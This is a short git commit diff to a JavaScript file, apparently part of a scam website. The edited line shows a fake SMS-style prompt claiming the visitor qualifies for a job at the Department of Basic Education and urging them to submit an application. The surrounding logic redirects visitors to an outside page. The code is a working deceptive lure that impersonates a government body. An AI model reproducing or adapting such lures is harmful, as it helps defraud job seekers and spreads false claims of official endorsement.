0b85c65c471779b3bd4121ce6e06496fe563f4eb
vibeblog <enom02567@gmail.com>
2025-04-05 11:43:52 +0100

    Update sajob-active.js

--- sajob-active.js
+++ sajob-active.js
@@ -1,5 +1,5 @@
 var password = 'APPLY NOW'
-password=prompt('SMS: Congratulations, you are qualify to work at Department of Basic Education, Press Ok submit application Now ','APPLY NOW');
+password=prompt('SMS: Congratulations, you are qualify to work at The Department of Basic Education, Press Ok submit application Now ','APPLY NOW');
 if (password != 'APPLY NOW') {
 location.href='https://bestplug.org/gauteeng.html';
 }
